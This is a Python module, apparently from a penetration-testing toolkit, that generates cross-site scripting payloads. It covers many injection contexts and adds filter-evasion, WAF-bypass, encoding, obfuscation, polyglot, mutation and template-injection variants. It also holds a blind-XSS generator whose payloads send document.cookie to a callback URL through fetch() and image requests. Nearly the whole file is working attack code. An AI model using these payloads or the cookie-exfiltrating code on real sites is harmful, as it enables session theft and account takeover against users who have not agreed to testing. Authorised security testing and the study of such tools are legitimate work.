"""XSS Payload Generator."""

import base64
import urllib.parse
from pathlib import Path
from typing import List


class XSSGenerator:
    """Generate XSS payloads for various contexts."""

    def __init__(self):
        """Initialize generator."""
        self.templates_dir = Path(__file__).parent / "templates"

    def generate(
        self,
        context: str,
        payload_type: str,
        filter_evasion: bool = False
    ) -> List[str]:
        """Generate XSS payloads.

        Args:
            context: Context (script, html, attribute, url, css, json)
            payload_type: Type (reflected, stored, dom)
            filter_evasion: Enable filter evasion techniques

        Returns:
            List of XSS payloads
        """
        context = context.lower()
        payload_type = payload_type.lower()

        # Route to appropriate generator
        if context == "script":
            payloads = self.generate_script_context(filter_evasion)
        elif context == "html":
            payloads = self.generate_html_context()
        elif context == "attribute":
            payloads = self.generate_attribute_context()
        elif context == "url":
            payloads = self.generate_url_context()
        elif context == "css":
            payloads = self.generate_css_context()
        elif context == "json":
            payloads = self.generate_json_context()
        else:
            # Default to HTML context
            payloads = self.generate_html_context()

        # Add DOM-specific payloads if requested
        if payload_type == "dom":
            payloads.extend(self.generate_dom_based())

        return payloads

    # Context-Specific Generators

    def generate_script_context(self, filter_evasion: bool = False) -> List[str]:
        """Generate payloads for script context."""
        payloads = [
            "<script>alert(1)</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(document.cookie)</script>",
            "<script>console.log(1)</script>",
            "<script>prompt(1)</script>",
            "</script><script>alert(1)</script>",
            "'</script><script>alert(1)</script>",
            '"</script><script>alert(1)</script>',
            "';alert(1);//",
            '";alert(1);//',
            "'-alert(1)-'",
            '"-alert(1)-"',
        ]

        if filter_evasion:
            payloads.extend(self.generate_filter_evasion())

        return payloads

    def generate_html_context(self) -> List[str]:
        """Generate payloads for HTML context."""
        return [
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror=alert(document.domain)>",
            "<svg onload=alert(1)>",
            "<svg><script>alert(1)</script></svg>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<marquee onstart=alert(1)>",
        ]

    def generate_attribute_context(self) -> List[str]:
        """Generate payloads for attribute context."""
        return [
            '" onload="alert(1)',
            "' onload='alert(1)",
            '" onfocus="alert(1)" autofocus="',
            "' onfocus='alert(1)' autofocus='",
            '" onclick="alert(1)',
            "' onclick='alert(1)",
            '" onmouseover="alert(1)',
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            '" /><img src=x onerror=alert(1)>',
        ]

    def generate_url_context(self) -> List[str]:
        """Generate payloads for URL context."""
        return [
            "javascript:alert(1)",
            "javascript:alert(document.domain)",
            "javascript:void(alert(1))",
            "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        ]

    def generate_css_context(self) -> List[str]:
        """Generate payloads for CSS context."""
        return [
            "</style><script>alert(1)</script>",
            "expression(alert(1))",
            "expression(alert(document.domain))",
            "};alert(1);//",
            "};alert(1);{",
        ]

    def generate_json_context(self) -> List[str]:
        """Generate payloads for JSON context."""
        return [
            '","x":"</script><script>alert(1)</script>',
            '\\"-alert(1)-\\"',
            '"}</script><script>alert(1)</script><script>{"',
        ]

    # Specialized Generators

    def generate_dom_based(self) -> List[str]:
        """Generate DOM-based XSS payloads."""
        return [
            "<img src=x onerror=alert(document.domain)>",
            '<img src=x onerror="alert(location.href)">',
            '<img src=x onerror="alert(window.location)">',
            '#<img src=x onerror=alert(1)>',
            'javascript:alert(document.domain)',
        ]

    def generate_for_dom_sink(self, sink: str) -> List[str]:
        """Generate payloads for specific DOM sink."""
        if sink.lower() == "innerhtml":
            return [
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
            ]
        elif sink.lower() == "document.write":
            return [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
            ]
        elif sink.lower() == "eval":
            return [
                "alert(1)",
                "alert(document.domain)",
            ]
        else:
            return self.generate_html_context()

    def generate_reflected(self) -> List[str]:
        """Generate reflected XSS payloads."""
        return self.generate_html_context()

    def generate_stored(self) -> List[str]:
        """Generate stored XSS payloads."""
        # Stored XSS can be more persistent/subtle
        return [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            '"><img src=x onerror=alert(1)>',
            "<script>alert(document.domain)</script>",
        ]

    def generate_event_handlers(self) -> List[str]:
        """Generate event handler-based XSS."""
        return [
            "<img src=x onerror=alert(1)>",
            "<body onload=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            "<textarea autofocus onfocus=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
        ]

    def generate_img_payloads(self) -> List[str]:
        """Generate IMG tag-based XSS."""
        return [
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror=alert(document.domain)>",
            "<img/src=x/onerror=alert(1)>",
            "<img src=x onerror=alert`1`>",
            '<img src="x" onerror="alert(1)">',
        ]

    # Filter Evasion

    def generate_filter_evasion(self) -> List[str]:
        """Generate filter evasion payloads."""
        return [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<script>eval('al'+'ert(1)')</script>",
            "<script>eval('al\\x65rt(1)')</script>",
            "<script>\\u0061lert(1)</script>",
            "<script>ale\\u0072t(1)</script>",
            "<script>/**/alert(1)/**/</script>",
            "<img/src=x/onerror=alert(1)>",
            "<svg><script>alert(1)</script></svg>",
        ]

    def generate_case_variants(self, payload: str) -> List[str]:
        """Generate case variation evasion."""
        variants = [payload]

        # Uppercase
        variants.append(payload.upper())

        # Lowercase
        variants.append(payload.lower())

        # Mixed case
        mixed = ""
        for i, char in enumerate(payload):
            mixed += char.upper() if i % 2 == 0 else char.lower()
        variants.append(mixed)

        return list(set(variants))

    def generate_encoded_variants(self, payload: str) -> List[str]:
        """Generate encoding-based evasion."""
        variants = []

        # HTML entity encoding
        variants.append(self.encode_html_entities(payload))

        # Unicode encoding
        variants.append(self.encode_unicode(payload))

        # Hex encoding
        variants.append(self.encode_hex(payload))

        return variants

    def obfuscate_javascript(self, payload: str) -> List[str]:
        """Obfuscate JavaScript payload."""
        variants = []

        # String concatenation
        if "alert" in payload:
            variants.append(payload.replace("alert", "'al'+'ert'"))
            variants.append(payload.replace("alert", "eval('al'+'ert')"))

        # Hex encoding
        if "alert" in payload:
            hex_encoded = "\\x61\\x6c\\x65\\x72\\x74"
            variants.append(payload.replace("alert", f"eval('{hex_encoded}')"))

        # Unicode
        if "alert" in payload:
            variants.append(payload.replace("alert", "\\u0061lert"))

        return variants

    # Encoding Methods

    def encode_html_entities(self, payload: str) -> str:
        """Encode to HTML entities."""
        encoded = ""
        for char in payload:
            if char in "<>\"'":
                encoded += f"&#{ord(char)};"
            else:
                encoded += char
        return encoded

    def encode_unicode(self, payload: str) -> str:
        """Encode to Unicode."""
        encoded = ""
        for char in payload:
            if char.isalpha():
                encoded += f"\\u{ord(char):04x}"
            else:
                encoded += char
        return encoded

    def encode_hex(self, payload: str) -> str:
        """Encode to hex."""
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    def encode_decimal(self, payload: str) -> str:
        """Encode to decimal HTML entities."""
        return "".join(f"&#{ord(c)};" for c in payload)

    # Advanced Techniques

    def generate_polyglots(self) -> List[str]:
        """Generate polyglot XSS payloads."""
        return [
            'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\" onmouseover=/*&lt;svg/*/onload=alert()//>',
            '">\'><marquee><img src=x onerror=confirm(1)></marquee></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>',
        ]

    def generate_waf_bypass(self) -> List[str]:
        """Generate WAF bypass payloads."""
        return [
            "<img/src=x/onerror=alert(1)>",
            "<svg><script>alert(1)</script></svg>",
            "<iframe src=java%09script:alert(1)>",
            "<iframe src=java%0ascript:alert(1)>",
            "<iframe src=java%0dscript:alert(1)>",
        ]

    def inject_null_bytes(self, payload: str) -> List[str]:
        """Inject null bytes for filter bypass."""
        variants = [payload]

        # Add null bytes
        if "<script>" in payload:
            variants.append(payload.replace("<script>", "<script%00>"))
            variants.append(payload.replace("<script>", "<scri%00pt>"))

        return variants

    def generate_mutation_xss(self) -> List[str]:
        """Generate mutation-based XSS (mXSS)."""
        return [
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
            "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>",
        ]

    def generate_template_injection(self) -> List[str]:
        """Generate template injection payloads."""
        return [
            "{{7*7}}",
            "{{constructor.constructor('alert(1)')()}}",
            "{{''.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
        ]

    def generate_protocol_handlers(self) -> List[str]:
        """Generate protocol handler payloads."""
        return [
            "javascript:alert(1)",
            "javascript:void(alert(1))",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox(1)",
        ]

    def generate_svg_payloads(self) -> List[str]:
        """Generate SVG-based XSS."""
        return [
            "<svg onload=alert(1)>",
            "<svg><script>alert(1)</script></svg>",
            "<svg><animate onbegin=alert(1)>",
            "<svg><set onbegin=alert(1)>",
        ]

    def generate_blind_xss(self, callback_url: str) -> List[str]:
        """Generate blind XSS payloads with callback."""
        return [
            f"<script>fetch('{callback_url}?c='+document.cookie)</script>",
            f"<img src=x onerror=fetch('{callback_url}?c='+document.cookie)>",
            f"<script>new Image().src='{callback_url}?c='+document.cookie</script>",
        ]

    # Utility

    def detect_context(self, html: str, user_input: str) -> str:
        """Detect XSS context from HTML response."""
        # Find where user input appears
        index = html.find(user_input)
        if index == -1:
            return "unknown"

        # Check surrounding context
        before = html[max(0, index - 50):index]
        after = html[index + len(user_input):min(len(html), index + len(user_input) + 50)]

        # Determine context
        if "<script>" in before or "</script>" in after:
            return "script"
        elif 'value="' in before or "value='" in before:
            return "attribute"
        elif "<" in before and ">" in after:
            return "html"
        else:
            return "html"
